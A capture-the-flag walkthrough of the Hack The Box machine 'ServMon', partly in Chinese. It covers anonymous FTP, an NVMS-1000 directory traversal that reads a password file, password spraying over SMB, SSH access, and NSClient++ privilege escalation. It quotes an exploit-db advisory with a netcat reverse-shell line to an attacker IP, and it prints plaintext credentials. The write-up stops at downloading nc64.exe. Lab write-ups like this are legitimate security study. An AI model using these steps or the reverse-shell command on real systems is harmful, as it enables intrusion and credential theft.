## ServMon
```
[★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.227.77 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
[★]$ nmap -p$ports -sC -sV 10.129.227.77
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-08 01:01 CST
Nmap scan report for 10.129.227.77
Host is up (0.066s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| http-title: NSClient++
|_Requested resource was /index.html
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data.
```
```
[★]$ ftp 10.129.227.77
Connected to 10.129.227.77.
220 Microsoft FTP Service
Name (10.129.227.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.

ftp> dir
229 Entering Extended Passive Mode (|||49680|)
125 Data connection already open; Transfer starting.
02-28-22  06:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49681|)
150 Opening ASCII mode data connection.
02-28-22  06:36PM       <DIR>          Nadine
02-28-22  06:37PM       <DIR>          Nathan
226 Transfer complete.

ftp> ls Nathan
229 Entering Extended Passive Mode (|||49683|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> get "Nathan\\Notes to do.txt"
local: Nathan\\Notes to do.txt remote: Nathan\\Notes to do.txt
229 Entering Extended Passive Mode (|||49684|)
125 Data connection already open; Transfer starting.
100% |***********************************|   182        2.67 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 4 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
182 bytes received in 00:00 (2.66 KiB/s)

ftp> cd Nadine
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49685|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> get "Nadine\\Confidential.exe
local: Nadine\\Confidential.exe remote: Nadine\\Confidential.exe
229 Entering Extended Passive Mode (|||49686|)
550 The system cannot find the path specified.   //550 是错误

ftp> exit
221 Goodbye.
[★]$ ls
'Nathan\\Notes to do.txt'

[★]$ cd desktop
bash: cd: desktop: No such file or directory
[★]$ ls Desktop
htb_vpn_logs.log  my_credentials.txt  my_data  README.license

//Notes to do.txt包含关于已安装的任务的已完成和未完成任务的信息监控应用程序
[★]$ cat 'Nathan\\Notes to do.txt'
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint

[★]$ ls Desktop
htb_vpn_logs.log  my_credentials.txt  my_data  README.license
[★]$ cat Desktop/my_credentials.txt
Username: syareya55
Password: cqroAqyi
```
#### 对ftp的正确示范
```
[★]$ ftp 10.129.227.77
Connected to 10.129.227.77.
220 Microsoft FTP Service
Name (10.129.227.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49685|)
150 Opening ASCII mode data connection.
02-28-22  06:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49686|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM       <DIR>          Nadine
02-28-22  06:37PM       <DIR>          Nathan
226 Transfer complete.

ftp> ls Nadine
229 Entering Extended Passive Mode (|||49687|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> get "Nadine\\Confidential.txt"
local: Nadine\\Confidential.txt remote: Nadine\\Confidential.txt
229 Entering Extended Passive Mode (|||49688|)
150 Opening ASCII mode data connection.
100% |***********************************|   168       18.74 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 6 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
168 bytes received in 00:00 (18.31 KiB/s)

ftp> ls Nathan
229 Entering Extended Passive Mode (|||49689|)
150 Opening ASCII mode data connection.
02-28-22  06:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> get "Nathan\\Notes to do.txt"
local: Nathan\\Notes to do.txt remote: Nathan\\Notes to do.txt
229 Entering Extended Passive Mode (|||49690|)
150 Opening ASCII mode data connection.
100% |***********************************|   182       20.29 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 4 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
182 bytes received in 00:00 (20.04 KiB/s)
ftp> exit
221 Goodbye.

[★]$ ls
 47774.txt          Documents  'Nadine\\Confidential.txt'   Templates
 cacert.der         Downloads  'Nathan\\Notes to do.txt'    Videos
 Confidential.txt   Music       Pictures
 Desktop            my_data     Public

[★]$ cat 'Nadine\\Confidential.txt'
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
//我把你的密码.txt文件留在你桌面上了。请删除此编辑后，你自己，并把它放回安全文件夹。
Regards

Nadine

[★]$ cat 'Nathan\\Notes to do.txt'
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
#### 在浏览器中检查80端口，可以看到NVMS-1000网络监控的登录页面软件。默认凭证admin / 123456或其他常见凭证不给我们访问。
```
[★]$ gobuster dir -u http://10.129.227.77 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 40 -o gobuster-80-root-medium
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.227.77
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://10.129.227.77/41b172ec-d70c-40c2-a83c-d7619ddf5e13 => 200 (Length: 118). To continue please exclude the status code or the length
```
![images/2026020801.png)
```
[★]$ curl http://10.129.227.77/41b172ec-d70c-40c2-a83c-d7619ddf5e13
<?xml version="1.0" encoding="UTF-8"?>
<response>	<status>fail</status>
	<errorCode>536870934</errorCode>
</response>
```
#### 我尝试了wfuzz，在那里我可以根据响应长度进行过滤。它可以处理几千个请求，但每次都失败了：
```
[★]$ wfuzz -c -u http://10.129.227.77/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hh 118
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.227.77/FUZZ
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000001:   200        12 L     22 W       338 Ch      "# directory-li
                                                        st-lowercase-2.
                                                        3-medium.txt"  
000000007:   200        12 L     22 W       338 Ch      "# license, vis
                                                        it http://creat
                                                        ivecommons.org/
                                                        licenses/by-sa/
                                                        3.0/"          
000000003:   200        12 L     22 W       338 Ch      "# Copyright 20
                                                        07 James Fisher
                                                        "              
000000014:   200        12 L     22 W       338 Ch      "http://10.129.
                                                        227.77/"       
000000013:   200        12 L     22 W       338 Ch      "#"            
```
### Vulnerabilities  缺陷
#### searchsplit显示了此应用程序中的目录遍历漏洞：
```
[★]$ searchsploit "nvms 1000"
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal               | hardware/webapps/47774.txt
TVT NVMS 1000 - Directory Traversal           | hardware/webapps/48311.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results

[★]$ searchsploit -m hardware/webapps/47774.txt
[★]$ cat 47774.txt
# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
### Website-TCP 8443
#### 8443号上有一个TLS服务器。通常使用证书，我将获得主机名并可能查找vhosts，但此证书仅用于localhost。
#### 该站点是NSClient++的一个实例，一个用于监控的代理：
#### 这里似乎坏得很厉害。在chrome（而不是Firefox）中访问确实提供了登录（某些时候）。
#### 让这个网站工作是相当令人沮丧的。就像我上面说的，我在Chromium上比在Firefox上取得了更大的成功，但即使那样，它也不稳定。
### Vulnerabilities 缺陷 NSClient++ 0.5.2.35:
```
[★]$ searchsploit nsclient
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Co | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation    | windows/local/46802.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```
#### 这是一个本地私有，因为在盒子上有一个shell，我可以从配置文件中获得admin明文密码，然后登录并创建一个工作来获得shell。我会记住的。
```
[★]$ searchsploit -m windows/local/46802.txt
  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46802
     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (466)
Copied to: /home/syareya55/46802.txt

[★]$ cat 46802.txt
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\Program Files\NSClient++>nscp web -- password --display
	Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
	@echo off
	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
	nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
	- foobar
		command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
	- foobar
		interval = 1m
		command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
	nc -nlvvp 443
	listening on [any] 443 ...
	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
	Microsoft Windows [Version 10.0.17134.753]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\Program Files\NSClient++>whoami
	whoami
	nt authority\system

Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
```
### Shell as nadine
#### 得到密码
#### 我首先尝试使用目录遍历漏洞读取NSClient++配置文件，但它不起作用。

#### 我从FTP笔记中知道，在C:\users\nathan\desktop\password.txt有一个密码文件。我将使用目录遍历漏洞来尝试读取该文件，它可以工作：
![图片](images/2026020902.png)
```
[★]$ burpsuite

浏览器导航到http://10.129.227.77
设置浏览器为本地地址端口是8080，同burpsuite的8080端口一样
浏览器http://10.129.227.77开始添加为：
http://10.129.227.77/../../../../../../../../../../../../users/nathan/desktop/passwords.txt回车
在burpsuite,Ctrl+R,Shitf+Ctrl+R,同样添加../../../../../../../../../../../../然后Send:
```
![图片](images/2026020903.png)
```
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
### Check Passwords
#### 因为我只有一个没有用户名的密码列表，所以我将创建一个我现在知道的列表：
```
[★]$ cat users
administrator
nathan
nadine

[★]$ cat passwords
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
#### 我现在可以使用crackmapexec来查看这些密码是否适用于smb的任何用户：
```
[★]$ crackmapexec smb 10.129.227.77 -u users -p passwords
SMB         10.129.227.77   445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.129.227.77   445    SERVMON          [-] ServMon\administrator:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\administrator:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\administrator:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\administrator:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE
SMB         10.129.227.77   445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk
```
### SSH
#### Metasploit 和 Windows OpenSSH 的“要 shell 方式”不兼容
####  由于SSH正在监听这个Windows盒子，我可以使用它来获取shell：
```
[★]$ sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.129.227.77  //没有反应
```
```
[★]$ ssh nadine@10.129.227.77
The authenticity of host '10.129.227.77 (10.129.227.77)' can't be established.
ED25519 key fingerprint is SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.227.77' (ED25519) to the list of known hosts.
nadine@10.129.227.77's password: 

Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
```
### Priv: nadine –> SYSTEM
```
nadine@SERVMON C:\Program Files\NSClient++>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 20C1-47A1

 Directory of C:\Program Files\NSClient++

02/28/2022  06:55 PM    <DIR>          .
02/28/2022  06:55 PM    <DIR>          ..
<SNIP>
11/05/2017  09:42 PM            55,808 NSCP.Core.dll
01/28/2018  10:32 PM         4,765,208 nscp.exe
11/05/2017  09:42 PM           483,328 NSCP.Protobuf.dll
11/19/2017  04:18 PM           534,016 nscp_json_pb.dll
11/19/2017  03:55 PM         2,090,496 nscp_lua_pb.dll
01/23/2018  08:57 PM           507,904 nscp_mongoose.dll
11/19/2017  03:49 PM         2,658,304 nscp_protobuf.dll
11/05/2017  10:04 PM             3,921 old-settings.map
01/28/2018  10:21 PM         1,973,760 plugin_api.dll
05/23/2015  07:44 AM         3,017,216 python27.dll
09/27/2015  02:42 PM        28,923,515 python27.zip
01/28/2018  10:34 PM           384,536 reporter.exe
02/28/2022  06:55 PM    <DIR>          scripts
02/28/2022  06:55 PM    <DIR>          security
12/08/2015  11:16 PM           348,160 ssleay32.dll
05/23/2015  07:44 AM           689,664 unicodedata.pyd
02/28/2022  06:55 PM    <DIR>          web
11/05/2017  09:20 PM         1,273,856 where_filter.dll
05/23/2015  07:44 AM            47,616 _socket.pyd
              33 File(s)     53,145,227 bytes
               7 Dir(s)   6,114,344,960 bytes free

nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display       
Current password: ew2x6SsGTxjRwXOT

nadine@SERVMON C:\Program Files\NSClient++>
```
#### 关于https:IP:8443端口 确实是没有跳出登录的端口这个问题，加个域名就完事了
```
[★]$ echo '10.129.227.77' | sudo tee -a /etc/hosts
10.129.227.77
```
```
[★]$ searchsploit 'NSClient++'
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Co | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation    | windows/local/46802.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
[★]$ searchsploit -m windows/locak/46802.txt //前面下载过了
  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46802
     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (466)
Copied to: /home/syareya55/46802.txt

[★]$ cat 46802.txt
Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\Program Files\NSClient++>nscp web -- password --display
	Current password: SoSecret

```
```
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 
ï»¿# If you want to fill this file with all available options run the following 
command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1


; in flight - TODO
[/settings/NRPE/server]

; Undocumented key
ssl options = no-sslv2,no-sslv3
```
#### 除了密码之外，配置文件还告诉我们，只允许从127.0.0.1进行连接。这在Notes to do.txt中也有说明：“2)锁定NSClient访问-完成”。
```
[★]$ ssh nadine@10.129.227.77 -L 8443:127.0.0.1:8443
nadine@10.129.227.77's password: 

Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved. 

nadine@SERVMON C:\Users\Nadine>

```
#### 我们可以通过检查机器上的侦听端口来验证端口转发是否正在运行。
```
[★]$ ss -alnp | grep 8443
tcp   LISTEN 0      128                                        127.0.0.1:8443             0.0.0.0:*    users:(("ssh",pid=147723,fd=5))           
tcp   LISTEN 0      128                                            [::1]:8443                [::]:*    users:(("ssh",pid=147723,fd=4))
```
#### https://localhost:8443
#### 首先，我们必须转到NSClient++的settings选项卡，以便创建一个新脚本。
#### Settings -> settings -> external scripts -> scripts -> Add an alias
![图片](images/2026020904.png)
#### 我们创建一个执行nc.exe的新脚本（它可以使用scp上传，也可以直接从我们的smb-share上传），并向我们的机器返回一个反向shell。
#### 该漏洞说明系统需要重新启动才能触发该漏洞，然而在挖掘web控制台时，我发现可以直接从web控制台执行脚本。
#### 通过在web控制台中输入脚本的别名，我们可以手动执行负载。
```
[★]$ wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
```

